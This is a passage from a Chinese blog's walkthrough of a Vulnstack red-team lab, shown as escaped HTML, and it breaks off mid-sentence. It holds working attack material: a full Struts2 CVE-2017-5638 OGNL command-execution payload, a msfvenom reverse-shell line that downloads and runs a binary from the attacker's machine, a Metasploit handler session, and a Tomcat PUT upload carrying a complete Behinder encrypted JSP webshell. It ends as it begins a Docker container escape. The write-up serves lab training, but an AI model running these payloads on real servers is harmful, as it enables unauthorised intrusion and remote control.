class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e (GMT8) (\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                       \n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                                                                                                                   \n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e                                                                                                                                                              \n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: No banner retrieved                                                               \n+ /: The anti-clickjacking X-Frame-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparke\nr.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/\n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)                                                                                                              \n+ /favicon.ico: identifies this app/server \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e: Apache Tomcat (possibly \u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.26\u003c/span\u003e through \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.15\u003c/span\u003e), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon\n+ /nikto-test-7haKDeBL.html: HTTP method \u003cspan class=\"hljs-string\"\u003e'PUT'\u003c/span\u003e allows clients to save files on the web server. See: https://portswigger.net/kb/issues/\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e100900_http-put-method-\u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e-enabled\n+ /favicon.ico: identifies this app/server \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e: Apache Tomcat (possibly \u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.26\u003c/span\u003e through \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.15\u003c/span\u003e), Alfresco Community. See: https://en.wikipedia.org/wiki/Favicon                    [\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e122\u003c/span\u003e]\n+ /nikto-test-7haKDeBL.html: HTTP method \u003cspan class=\"hljs-string\"\u003e'PUT'\u003c/span\u003e allows clients to save files on the web server. See: https://portswigger.net/kb/issues/\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e100900_http-put-method-\u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e-enabled               \n+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .                                                                                                                \n+ HTTP method (\u003cspan class=\"hljs-string\"\u003e'Allow'\u003c/span\u003e Header): \u003cspan class=\"hljs-string\"\u003e'PUT'\u003c/span\u003e method could allow clients to save files on the web server.                                                                                       \n+ HTTP method (\u003cspan class=\"hljs-string\"\u003e'Allow'\u003c/span\u003e Header): \u003cspan class=\"hljs-string\"\u003e'DELETE'\u003c/span\u003e may allow clients to remove files on the web server.                                                                                           \n+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.                                                                                                               \n+ /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users. See: http://cve.mitre.org/cgi-\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/cvename.cgi?name=CVE-\u003cspan class=\"hljs-number\"\u003e2004\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2104\u003c/span\u003e                      \n+ /manager/manager-howto.html: Tomcat documentation found. See: CWE-\u003cspan class=\"hljs-number\"\u003e552\u003c/span\u003e                                                                                                                 \n+ /manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                                 \n+ /host-manager/html: Default Tomcat Manager / Host Manager interface found.                                                                                                            \n+ /manager/status: Default Tomcat Server Status interface found.                                                                                                                        \n+ /host-manager/status: Default Tomcat Server Status interface found.                                                                                                                   \n+ \u003cspan class=\"hljs-number\"\u003e9610\u003c/span\u003e requests: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e error(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e item(s) reported on remote host                                                                                                                      \n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e (GMT8) (\u003cspan class=\"hljs-number\"\u003e44\u003c/span\u003e seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ Target IP:          \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                                                                                                                   \n+ Target Hostname:    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.157\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.128\u003c/span\u003e                                                       \n+ Target Port:        \u003cspan class=\"hljs-number\"\u003e2003\u003c/span\u003e                                                                                                                                                              \n+ Start Time:         \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e (GMT8)                                                                                                                                        \n---------------------------------------------------------------------------                                                                                                             \n+ Server: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.25\u003c/span\u003e (Debian)                                                                                                                                                        \n+ /: Retrieved x-powered-by header: PHP/\u003cspan class=\"hljs-number\"\u003e7.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003e.                                                                                                                                          \n+ /: Uncommon header \u003cspan class=\"hljs-string\"\u003e'x-ob_mode'\u003c/span\u003e found, \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e contents: \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e                                                                                                                               \n+ /TrzGOLfn.show_query_columns: The X-Content-\u003cspan class=\"hljs-type\"\u003eType\u003c/span\u003e-Options header \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e. This could allow the user agent to render the content of the site \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e a different fashion to the MIME \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e-header/                                                                                 \n+ No CGI Directories found (use \u003cspan class=\"hljs-string\"\u003e'-C all'\u003c/span\u003e to force check \u003cspan class=\"hljs-built_in\"\u003eall\u003c/span\u003e possible dirs)                                                                                                              \n+ Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.25\u003c/span\u003e appears to be outdated (current \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e at least Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.54\u003c/span\u003e). Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.34\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e the EOL \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the \u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003ex branch.                                                                \n+ Multiple index files found: /index.php, /index.jsp.                                                                                                                                   \n+ /: Web Server returns a valid response \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e junk HTTP methods which may cause false positives.                                                                                        \n+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e-aspnet-applications?view=vs-\u003cspan class=\"hljs-number\"\u003e2017\u003c/span\u003e    \n+ /README: README file found.                                                               \n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/                                                                     \n+ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      \n+ /composer.lock: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/                                                                      \n+ /package.json: Node.js package file found. It may contain sensitive information.                                                                                                      \n+ \u003cspan class=\"hljs-number\"\u003e17689\u003c/span\u003e requests: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e error(s) \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e item(s) reported on remote host                         \n+ End Time:           \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e-02 \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e (GMT8) (\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e seconds)                                                                                                                           \n---------------------------------------------------------------------------                                                                                                             \n+ \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e host(s) tested                                    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e2001\u003c/code\u003e端口可能存在\u003ccode\u003eCVE-2017-5638\u003c/code\u003e ，\u003ccode\u003e2002\u003c/code\u003e 端口允许\u003ccode\u003eput\u003c/code\u003e和\u003ccode\u003edelete\u003c/code\u003e方法（可能存在\u003ccode\u003eCVE-2017-12615\u003c/code\u003e）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e访问主页\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e2001\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image51.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e文件上传页面\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e2002\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image52.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e2003\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image53.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e竟然是\u003ccode\u003ephpmyadmin\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eCVE-2017-5638\u003c/h3\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/moyudaxia/p/14445883.html\"\u003ehttps://www.cnblogs.com/moyudaxia/p/14445883.html\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e发现和靶机页面一模一样，应该是使用直接\u003ccode\u003eDocker\u003c/code\u003e造的\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e验证漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eContent-Type: %{\u003cspan class=\"hljs-meta\"\u003e#context[\u003cspan class=\"hljs-string\"\u003e'com.opensymphony.xwork2.dispatcher.HttpServletResponse'\u003c/span\u003e].addHeader(\u003cspan class=\"hljs-string\"\u003e'vulhub'\u003c/span\u003e,233*233)}.multipart/form-data\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image54.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e漏洞存在\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eEXP，存在命令执行\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eContent-Type: \u003cspan class=\"hljs-string\"\u003e\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='RCE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e进行反弹\u003ccode\u003eshell\u003c/code\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003emsfvenom\u003c/code\u003e生成\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp lhost=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.129\u003c/span\u003e lport=\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -f raw                                                                         \n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: cmd from the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e117\u003c/span\u003e bytes\ncurl -so /tmp/irZWQXXBy http:\u003cspan class=\"hljs-comment\"\u003e//192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy \u0026#x26;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003emsf\u003c/code\u003e监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003e use exploit/multi/handler                                                                 \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload cmd/linux/http/x64/meterpreter/reverse_tcp             \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lhost 192.168.157.129                                                                                                                                 \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport 1234                                                     \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e run                                                                                                                                                       \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eexp\u003c/code\u003e中填入生成的\u003ccode\u003epayload\u003c/code\u003e，然后发送\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eContent-Type: \u003cspan class=\"hljs-string\"\u003e\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='curl -so /tmp/irZWQXXBy http://192.168.157.129:8080/gYBZzJWIpFJeIY1gYugNpQ; chmod +x /tmp/irZWQXXBy; /tmp/irZWQXXBy \u0026#x26;').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获得shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e run                                                                                                                                                       \n                                                                                                 \n[*] Started reverse TCP handler on 192.168.157.129:1234                              \n[*] Sending \u003cspan class=\"hljs-title function_\"\u003estage\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e3045380\u003c/span\u003e bytes)\u003c/span\u003e to 192.168.157.128                                             \n[*] Meterpreter session 1 \u003cspan class=\"hljs-title function_\"\u003eopened\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52614\u003c/span\u003e)\u003c/span\u003e at 2024-12-02 14:52:14 +0800                                                                           \n                                                                                                                                                                                        \nmeterpreter \u003e                                                                                                 \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eCVE-2017-12615\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eTomcat PUT\u003c/code\u003e方法任意写文件漏洞，利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e抓包然后修改为\u003ccode\u003ePUT\u003c/code\u003e方法，然后\u003ccode\u003e1.jsp\u003c/code\u003e是上传文件名，内容块里边是冰蝎的\u003ccode\u003eJSP\u003c/code\u003e脚本内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ePUT /\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003ejsp/ HTTP/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\nHost: \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2002\u003c/span\u003e\nUser-Agent: Mozilla/\u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e (Windows NT \u003cspan class=\"hljs-number\"\u003e10.0\u003c/span\u003e; Win64; x64; rv:\u003cspan class=\"hljs-number\"\u003e133.0\u003c/span\u003e) Gecko/\u003cspan class=\"hljs-number\"\u003e20100101\u003c/span\u003e Firefox/\u003cspan class=\"hljs-number\"\u003e133.0\u003c/span\u003e\nAccept: text/html,application/xhtml+xml,application/xml;q=\u003cspan class=\"hljs-number\"\u003e0.9\u003c/span\u003e,*\u003cspan class=\"hljs-comment\"\u003e/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://192.168.157.128:2001/\nSec-GPC: 1\nConnection: keep-alive\nCookie: JSESSIONID=ebkm5umq7o4emfo8amiifu8q; phpMyAdmin=0e02d819225d61988d3e5e0979e5bf09; pma_lang=zh_CN\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n\n\u0026#x3C;%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u0026#x3C;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u0026#x3C;%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用冰蝎连接，成功连接，获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image55.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后通过上边一样的方法反弹\u003ccode\u003eshell\u003c/code\u003e即可\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e信息收集\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e# id\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) gid=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root) groups=\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e(root)\n\u003cspan class=\"hljs-meta\"\u003e# whoami\u003c/span\u003e\nroot\n\u003cspan class=\"hljs-meta\"\u003e# uname -a\u003c/span\u003e\nLinux \u003cspan class=\"hljs-number\"\u003e174745108f\u003c/span\u003ecb \u003cspan class=\"hljs-number\"\u003e4.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-142\u003c/span\u003e-generic #\u003cspan class=\"hljs-number\"\u003e168\u003c/span\u003e~\u003cspan class=\"hljs-number\"\u003e14.04\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-Ubuntu SMP Sat Jan \u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e UTC \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e x86_64 GNU/Linux\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接就是\u003ccode\u003eroot\u003c/code\u003e权限？\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e判断是否是\u003ccode\u003eDocker\u003c/code\u003e环境\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e run post/linux/gather/checkcontainer \n\n[+] This appears to be a \u003cspan class=\"hljs-string\"\u003e'Docker'\u003c/span\u003e container\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e似乎这是一个\u003ccode\u003eDocker\u003c/code\u003e容器，再看根目录下是否存在\u003ccode\u003e.dockerenv\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecd /\npwd\n/\nls -al\ntotal \u003cspan class=\"hljs-number\"\u003e72\u003c/span\u003e\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e ..\n-rwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .dockerenv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e由此可以判断是在容器内\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eDocker逃逸\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://xz.aliyun.com/t/8558?time__1311=n4%2BxnD0DcDuD90WY4GNepDUh2YDOl9YD02L%2BiD#toc-3\"\u003ehttps://xz.aliyun.com/t/8558?time__1311=n4%2BxnD0DcDuD90WY4GNepDUh2YDOl9YD02L%2BiD#toc-3\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e想着尝试用\u003ccode\u003edirty cow\u003c/code\u003e来逃逸\u003ccode\u003eDocker\u003c/code\u003e，但是发现内核版本不在范围内，只能寻找别的方法\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后尝试 \u003cstrong\u003e利用特权模式进行逃逸\u003c/strong\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e使用\u003ccode\u003efdisk 